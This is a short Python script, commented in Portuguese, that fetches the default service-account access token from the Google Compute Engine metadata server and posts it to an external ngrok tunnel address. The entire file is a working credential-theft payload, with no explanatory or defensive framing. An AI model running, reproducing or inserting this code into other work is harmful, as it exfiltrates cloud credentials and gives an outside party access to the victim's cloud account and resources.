import os
import requests

# Tenta obter o token da metadata do Google Compute Engine
token_url = 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'
headers = {'Metadata-Flavor': 'Google'}
token_response = requests.get(token_url, headers=headers)

if token_response.status_code == 200:
    token = token_response.text
    
    # Enviar o token para o servidor ngrok
    url = "https://5735-67-205-141-215.ngrok-free.app/log"
    data = {'token': token}
    
    try:
        response = requests.post(url, data=data)
        print(f"Server responded with status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send token to server: {e}")
else:
    print(f"Failed to retrieve token: {token_response.status_code}")

